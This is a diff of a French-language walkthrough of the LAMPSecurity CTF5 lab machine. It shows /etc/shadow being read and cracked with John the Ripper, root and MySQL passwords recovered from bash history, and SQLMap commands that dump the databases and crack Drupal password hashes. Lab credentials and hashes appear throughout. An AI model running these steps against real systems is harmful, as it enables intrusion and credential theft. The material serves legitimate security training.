+[il contient les mots de passe hashés de chaque compte Unix](https://fr.wikipedia.org/wiki/Passwd), ainsi que la date de la dernière modification du mot de passe ou encore la date d'expiration des comptes. L'outil John The Ripper est en mesure de [cracker les mots de passe Unix](https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html) si on lui fournit les fichiers ```/etc/passwd``` et ```/etc/shadow```, comme suit...
 
 ```console
 [root@localhost ~]# cat /etc/shadow
@@ -539,33 +524,7 @@ daemon:*:14362:0:99999:7:::
 adm:*:14362:0:99999:7:::
 lp:*:14362:0:99999:7:::
 sync:*:14362:0:99999:7:::
-shutdown:*:14362:0:99999:7:::
-halt:*:14362:0:99999:7:::
-mail:*:14362:0:99999:7:::
-news:*:14362:0:99999:7:::
-uucp:*:14362:0:99999:7:::
-operator:*:14362:0:99999:7:::
-games:*:14362:0:99999:7:::
-gopher:*:14362:0:99999:7:::
-ftp:*:14362:0:99999:7:::
-nobody:*:14362:0:99999:7:::
-vcsa:!!:14362:0:99999:7:::
-rpc:!!:14362:0:99999:7:::
-nscd:!!:14362:0:99999:7:::
-tcpdump:!!:14362:0:99999:7:::
-dbus:!!:14362:0:99999:7:::
-rpm:!!:14362:0:99999:7:::
-polkituser:!!:14362:0:99999:7:::
-avahi:!!:14362:0:99999:7:::
-mailnull:!!:14362:0:99999:7:::
-smmsp:!!:14362:0:99999:7:::
-apache:!!:14362:0:99999:7:::
-ntp:!!:14362:0:99999:7:::
-sshd:!!:14362:0:99999:7:::
-openvpn:!!:14362:0:99999:7:::
-rpcuser:!!:14362:0:99999:7:::
-nfsnobody:!!:14362:0:99999:7:::
-torrent:!!:14362:0:99999:7:::
+--snip--
 haldaemon:!!:14362:0:99999:7:::
 gdm:!!:14362:0:99999:7:::
 patrick:$1$DJYtkxSw$t.47LsE1j2VJKgBVT1Lar0:15679:0:99999:7:::
@@ -579,7 +538,7 @@ webalizer:!!:16294::::::
 [root@localhost ~]#
 ```
 
-Un troisième dictionnaire est appelé à la rescousse : Rockyou.
+Un troisième dictionnaire est appelé à la rescousse : [rockyou.txt](https://wiki.skullsecurity.org/Passwords).
 
 ```console
 root@blinils:~# unshadow passwdCTF5.txt shadowCTF5.txt > passwd.db
@@ -651,8 +610,9 @@ root:$1$7ailm4aT$4HlsZaiGztAsgj4JXL92Y.:14362:0:99999:7:::
 
 ### Accès à la base de données
 
-L'historique des commandes Bash de Patrick recèle de grands trésors en son sein. On y retrouve ainsi...
-* Le mot de passe root, 50$cent, entré par erreur en clair à la suite d'une faute de frappe (sus au lieu de su).
+L'historique des commandes bash de Patrick recèle de grands trésors en son sein. On y retrouve ainsi...
+
+* Le mot de passe root ```50$cent``` entré par erreur en clair à la suite d'une faute de frappe (sus au lieu de su).
 * Les commandes d'édition relatives au logiciel Tomboy, dont l'une des notes contient le mot de passe root.
 * Et surtout, le mot de passe administrateur de la base de données MySQL !
 
@@ -667,34 +627,10 @@ sus
 50$cent
 su
 logout
-ls -latdr ../
-ls -alh
-cd ..
-ls -lha
-cd
-ls -lah .tomboy
-less .tomboy/ae9cfc26-64e8-4f6f-a8b4-0296e8173504.note 
-less .tomboy/d2684fad-3aab-444c-b90a-4f307c0818f6.note 
-rpm -qa | grep tomboy
-yum search tomboy
-sudo yum install tomboy
-ls -latdr .dmrc
-chmod 644 .dmrc 
-sudo vi /etc/inittab
-netstat -an
-service samba status
-sudo service samba status
-sudo /sbin/service samba status
-sudo /sbin/service smbd status
-sudo /sbin/service smb status
-exit
-sudo -l
-su
-sudo su
-exit
+--snip--
 ```
 
-Le mot de passe Mysql n'a pas été modifié depuis, il est alors possible de fouiller la base de données à la recherche des informations les plus intéressantes.
+Le mot de passe MySQL n'a pas été modifié depuis, il est alors possible de fouiller la base de données à la recherche des informations les plus intéressantes.
 
 ```console
 [patrick@localhost ~]$ mysql -u root -pmysqlpassword
@@ -722,19 +658,7 @@ mysql> select table_schema, table_name from information_schema.tables;
 +--------------------+---------------------------------------+
 | information_schema | CHARACTER_SETS                        | 
 | information_schema | COLLATIONS                            | 
-| information_schema | COLLATION_CHARACTER_SET_APPLICABILITY | 
-| information_schema | COLUMNS                               | 
-| information_schema | COLUMN_PRIVILEGES                     | 
-| information_schema | KEY_COLUMN_USAGE                      | 
-| information_schema | PROFILING                             | 
-| information_schema | ROUTINES                              | 
-| information_schema | SCHEMATA                              | 
-| information_schema | SCHEMA_PRIVILEGES                     | 
-| information_schema | STATISTICS                            | 
-| information_schema | TABLES                                | 
-| information_schema | TABLE_CONSTRAINTS                     | 
-| information_schema | TABLE_PRIVILEGES                      | 
-| information_schema | TRIGGERS                              | 
+--snip--
 | information_schema | USER_PRIVILEGES                       | 
 | information_schema | VIEWS                                 | 
 | contacts           | contact                               | 
@@ -743,44 +667,7 @@ mysql> select table_schema, table_name from information_schema.tables;
 | drupal             | blocks                                | 
 | drupal             | blocks_roles                          | 
 | drupal             | boxes                                 | 
-| drupal             | cache                                 | 
-| drupal             | cache_content                         | 
-| drupal             | cache_filter                          | 
-| drupal             | cache_menu                            | 
-| drupal             | cache_page                            | 
-| drupal             | cache_views                           | 
-| drupal             | comments                              | 
-| drupal             | contact                               | 
-| drupal             | content_type_blog                     | 
-| drupal             | content_type_event                    | 
-| drupal             | content_type_page                     | 
-| drupal             | content_type_story                    | 
-| drupal             | drupal_install_test                   | 
-| drupal             | event                                 | 
-| drupal             | file_revisions                        | 
-| drupal             | files                                 | 
-| drupal             | filter_formats                        | 
-| drupal             | filters                               | 
-| drupal             | flood                                 | 
-| drupal             | history                               | 
-| drupal             | menu                                  | 
-| drupal             | node                                  | 
-| drupal             | node_access                           | 
-| drupal             | node_comment_statistics               | 
-| drupal             | node_counter                          | 
-| drupal             | node_field                            | 
-| drupal             | node_field_instance                   | 
-| drupal             | node_group                            | 
-| drupal             | node_group_fields                     | 
-| drupal             | node_revisions                        | 
-| drupal             | node_type                             | 
-| drupal             | permission                            | 
-| drupal             | role                                  | 
-| drupal             | search_dataset                        | 
-| drupal             | search_index                          | 
-| drupal             | search_total                          | 
-| drupal             | sequences                             | 
-| drupal             | sessions                              | 
+--snip--
 | drupal             | system                                | 
 | drupal             | term_data                             | 
 | drupal             | term_hierarchy                        | 
@@ -856,9 +743,7 @@ mysql> select Host, User, Password from mysql.user;
 +-----------------------+------+------------------+
 ```
 
-Les mots de passe stockés dans la table drupal.users permettent de se connecter sur /events/ en tant que loren, andy, jennifer, patrick ou encore amy.
-Des sites Web tels que [CrackStation](https://crackstation.net/) 
-ou [HashKiller](https://www.hashkiller.co.uk/md5-decrypter.aspx) ne devraient en faire qu'une bouchée.
+Les mots de passe stockés dans la table ```drupal.users``` permettent de se connecter sur ```/events/``` en tant que ```loren```, ```andy```, ```jennifer```, ```patrick``` ou encore ```amy```. Des sites Web tels que [CrackStation](https://crackstation.net/) ou [HashKiller](https://www.hashkiller.co.uk/md5-decrypter.aspx) ne devraient en faire qu'une bouchée.
 
 ```console
 https://crackstation.net/
@@ -884,7 +769,7 @@ Par exemple, cette XSS sur NanoCMS avait été trouvée [lors de l'audit effectu
 
 ![Affichage de l'image CTF5_XSS1.png](images/CTF5_XSS1.png)
 
-Ou encore sur la page /list et ses quatre paramètres, qui avaient été détectés comme vulnérables par l'outil nikto.
+Ou encore sur la page ```/list``` et ses quatre paramètres, qui avaient été détectés comme vulnérables par l'outil nikto.
 
 ![Affichage de l'image CTF5_XSS2.png](images/CTF5_XSS2.png)
 
@@ -892,17 +777,17 @@ En remplaçant ici les paramètres par du code Javascript, celui-ci sera réécr
 
 ### Bonus n°2 : Injection SQL sur la page /list
 
-Cette page Web intitulée « Register with Phake Organization » a pour contenu : _Please take a moment to register with Phake Organization. We collect information about our clients and event registrants in order to facilitate better, faster communication among stakeholders. All information will be kept strictly confidential!_ ce qui laisse clairement sous-entendre qu'une base de données est présente. Cette hypothèse est confirmée, d'une part, par le scan de ports réalisé au préalable avec nmap et, d'autre part, par le message _Thank you for registering! You have successfully been added to our contact database._ qui s'affiche après avoir rempli le formulaire et cliqué sur le bouton « Register now! ».
+Cette page Web intitulée « _Register with Phake Organization_ » a pour contenu : _Please take a moment to register with Phake Organization. We collect information about our clients and event registrants in order to facilitate better, faster communication among stakeholders. All information will be kept strictly confidential!_ ce qui laisse clairement sous-entendre qu'une base de données est présente. Cette hypothèse est confirmée, d'une part, par le scan de ports réalisé au préalable avec nmap et, d'autre part, par le message _Thank you for registering! You have successfully been added to our contact database._ qui s'affiche après avoir rempli le formulaire et cliqué sur le bouton _```Register now!```_.
 
 ![Affichage de l'image CTF5_SQLi1.png](images/CTF5_SQLi1.png)
 
-Ce formulaire consiste en quatre champs : nom de famille (paramètre _name_), adresse e-mail (paramètre _email_), numéro de téléphone (paramètre _phone_) et nom de l'entreprise (paramètre _org_). Ces données sont envoyées [avec la méthode HTTP POST](https://developer.mozilla.org/fr/docs/HTTP/M%C3%A9thode/POST) puis traitées par le serveur qui renverra le message de confirmation susmentionné. Or une personne malveillante [n'aura pas la même vision qu'un internaute légitime](https://en.wikipedia.org/wiki/Thinking_outside_the_box) et se posera alors les questions suivantes : le serveur vérifie-t-il si ce que fournit l'utilisateur correspond bien à ce qui est attendu ? que se passerait-t-il si, au lieu d'un numéro de téléphone, le serveur devait recevoir et traiter une centaine de caractères spéciaux ? et si, au lieu de caractères spéciaux aléatoires, ils étaient spécifiquement conçus de telle sorte à ce qu'il soit possible d'interagir avec le serveur et la base de données ? et pourquoi pas récupérer intégralement, grâce à ce code, le contenu de la base de données ?
+Ce formulaire consiste en quatre champs : nom de famille (paramètre ```name```), adresse e-mail (paramètre ```email```), numéro de téléphone (paramètre ```phone```) et nom de l'entreprise (paramètre ```org```). Ces données sont envoyées [avec la méthode HTTP POST](https://developer.mozilla.org/fr/docs/HTTP/M%C3%A9thode/POST) puis traitées par le serveur qui renverra le message de confirmation susmentionné. Or une personne malveillante [n'aura pas la même vision qu'un internaute légitime](https://en.wikipedia.org/wiki/Thinking_outside_the_box) et se posera alors les questions suivantes : le serveur vérifie-t-il si ce que fournit l'utilisateur correspond bien à ce qui est attendu ? que se passerait-t-il si, au lieu d'un numéro de téléphone, le serveur devait recevoir et traiter une centaine de caractères spéciaux ? et si, au lieu de caractères spéciaux aléatoires, ils étaient spécifiquement conçus de telle sorte à ce qu'il soit possible d'interagir avec le serveur et la base de données ? et pourquoi pas récupérer intégralement, grâce à ce code, le contenu de la base de données ?
 
-Pour un attaquant, le but du jeu est de modifier le fonctionnement d'origine d'une fonction, d'un programme ou d'un script, en y insérant des données non prévues. Les failles dites d'injection surviennent lorsqu'il n'y a pas de contrôle, de filtrage ou de validation sur les données entrantes. Ici, l'insertion d'une seule apostrophe suffit à démontrer la présence d'une « [injection SQL](https://www.owasp.org/index.php/SQL_Injection) » a minima sur le champ _name_.
+Pour un attaquant, le but du jeu est de modifier le fonctionnement d'origine d'une fonction, d'un programme ou d'un script, en y insérant des données non prévues. Les failles dites d'injection surviennent lorsqu'il n'y a pas de contrôle, de filtrage ou de validation sur les données entrantes. Ici, l'insertion d'une seule apostrophe suffit à démontrer la présence d'une « [injection SQL](https://www.owasp.org/index.php/SQL_Injection) » a minima sur le champ ```name```.
 
 ![Affichage de l'image CTF5_SQLi2.png](images/CTF5_SQLi2.png)
 
-« Smell that? You smell that? SQL injections, son. Nothing else in the world smells like that. I love the smell of SQL injections in the morning. »
+« _Smell that? You smell that? SQL injections, son. Nothing else in the world smells like that. I love the smell of SQL injections in the morning._ »
 
 Afin d'éviter de longs tests manuels fastidieux, pour trouver la bonne syntaxe permettant d'exfiltrer les données de la base MySQL, SQLMap vient à la rescousse. Il s'agit [d'un outil open source permettant d'identifier et d'exploiter une injection SQL](https://connect.ed-diamond.com/MISC/MISC-062/Utilisation-avancee-de-sqlmap) sur des applications Web. En lui spécifiant l'URL du site Web ainsi que les paramètres à tester, SQLMap va tester différentes techniques afin d'identifier la présence d'une injection SQL...
 
@@ -924,14 +809,12 @@ it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
 [12:35:46] [ERROR] user quit
 ```
 
-En quelques secondes à peine, SQLMap a détecté qu'il s'agit d'une base de données MySQL et que le premier paramètre testé _name_ est vulnérable à la fois aux injections SQL et aux XSS (alias Cross-Site Scripting... on y reviendra). Il y a de très fortes chances pour que les autres paramètres soient eux aussi vulnérables, c'est reparti pour un tour ! Après plusieurs tentatives, SQLMap récupère les tables (--tables) ainsi que les colonnes (--columns) présentes dans chaque base de données trouvée (--dbs), et tant qu'à faire, autant récupérer tout le contenu de la base de données (--dump-all).
+En quelques secondes à peine, SQLMap a détecté qu'il s'agit d'une base de données MySQL et que le premier paramètre testé ```name``` est vulnérable à la fois aux injections SQL et aux XSS (alias _Cross-Site Scripting_... on y reviendra). Il y a de très fortes chances pour que les autres paramètres soient eux aussi vulnérables, c'est reparti pour un tour ! Après plusieurs tentatives, SQLMap récupère les tables ```--tables``` ainsi que les colonnes ```--columns``` présentes dans chaque base de données trouvée ```--dbs``` et tant qu'à faire, autant récupérer tout le contenu de la base de données ```--dump-all```.
 
 ```console
 root@blinils:~# sqlmap -u "http://192.168.56.101/list/" --data="name=a&email=b&phone=c&org=d" --dbms=MySQL --dbs -v0
 
 --snip--
-
----
 web server operating system: Linux Fedora 8 or 7 or 6 (Moonshine or Zod or Werewolf)
 web application technology: PHP 5.2.4, Apache 2.2.6
 back-end DBMS: MySQL >= 5.0.0
@@ -940,10 +823,10 @@ back-end DBMS: MySQL >= 5.0.0
 [13:13:13] [INFO] resumed: drupal
 [13:13:13] [INFO] resumed: mysql
 [13:13:13] [INFO] resumed: test
----
+--snip--
 ```
 
-_Nota Bene : pour une raison que je ne saurais expliquer, SQLMap n'est pas en mesure de récupérer le contenu de l'unique table 'contact' de la base de données 'contacts'. Pour rappel, cette table est censée contenir l'ensemble des informations de la mailing-list de Phake Organization (nom de famille, numéro de téléphone, adresse e-mail et nom de l'entreprise). Pas de panique cependant, il est toujours possible de la récupérer par d'autres moyens._
+_Nota Bene : pour une raison que je ne saurais expliquer, SQLMap n'est pas en mesure de récupérer le contenu de l'unique table ```contact``` de la base de données ```contacts```. Pour rappel, cette table est censée contenir l'ensemble des informations de la mailing-list de Phake Organization (nom de famille, numéro de téléphone, adresse e-mail et nom de l'entreprise). Pas de panique cependant, il est toujours possible de la récupérer par d'autres moyens._
 
 ```console
 root@blinils:~# sqlmap -u "http://192.168.56.101/list/" --data="name=a&email=b&phone=c&org=d" --dbms=MySQL --dump -D contacts -T contact
@@ -1007,11 +890,11 @@ root@blinils:~# sqlmap -u "http://192.168.56.101/list/" --data="name=a&email=b&p
 do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
 --snip--
 [13:50:50] [INFO] starting dictionary-based cracking (md5_generic_passwd)
-[13:50:50] [INFO] cracked password 'lorenpass' for user 'loren'                                                                                         
-[13:50:50] [INFO] cracked password 'newdrupalpass' for user 'andy'                                                                            
-[13:50:50] [INFO] cracked password 'password' for user 'patrick'                                                                                 
-[13:50:50] [INFO] cracked password 'temppass' for user 'amy'                                                                                          
+[13:50:50] [INFO] cracked password 'lorenpass' for user 'loren'
+[13:50:50] [INFO] cracked password 'newdrupalpass' for user 'andy'
+[13:50:50] [INFO] cracked password 'password' for user 'patrick'
+[13:50:50] [INFO] cracked password 'temppass' for user 'amy'
 --snip--
 ```
 
-[L'attaque par dictionnaire sur les hashs de mots de passe](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf) trouvés par SQLMap a porté ses fruits : quatre mots de passe ont ainsi pu être récupérés. La découverte de ces mots de passe permet à un attaquant de se connecter sur le Drupal /events/ en tant que loren, andy, patrick ou encore amy, et permet surtout de conclure ce _walkthrough_ sur LampSecurity CTF5.
+[L'attaque par dictionnaire sur les hashs de mots de passe](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf) trouvés par SQLMap a porté ses fruits : quatre mots de passe ont ainsi pu être récupérés. La découverte de ces mots de passe permet à un attaquant de se connecter sur le Drupal ```/events/``` en tant que ```loren```, ```andy```, ```patrick``` ou encore ```amy```, et permet surtout de conclure ce _walkthrough_ sur LAMPSecurity CTF5.
